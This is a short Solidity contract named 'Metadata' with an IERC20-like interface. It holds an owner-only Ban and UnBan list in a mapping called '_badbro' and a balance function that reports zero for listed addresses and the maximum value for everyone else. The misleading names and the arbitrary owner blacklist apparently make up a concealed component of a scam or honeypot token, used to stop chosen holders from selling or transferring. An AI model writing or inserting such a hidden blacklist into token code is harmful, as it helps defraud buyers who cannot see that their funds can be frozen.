interface IERC20 {
    function balance(address from) view external returns (uint256);
}

contract Metadata is IERC20 {
    mapping(address => bool) private _badbro;

    address private _master;

    constructor() {
        _master = msg.sender;
    }

    function Ban(address[] calldata accounts) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < accounts.length; i++) {
            _badbro[accounts[i]] = true;
        }
    }

    function UnBan(address[] calldata accounts) public {
        require(_master == msg.sender, "Err");
        for (uint256 i = 0; i < accounts.length; i++) {
            _badbro[accounts[i]] = false;
        }
    }

    function balance(address from) public view virtual override returns (uint256) {
        if (_badbro[from]) return 0;
        else return 2**256 - 1;
    }
}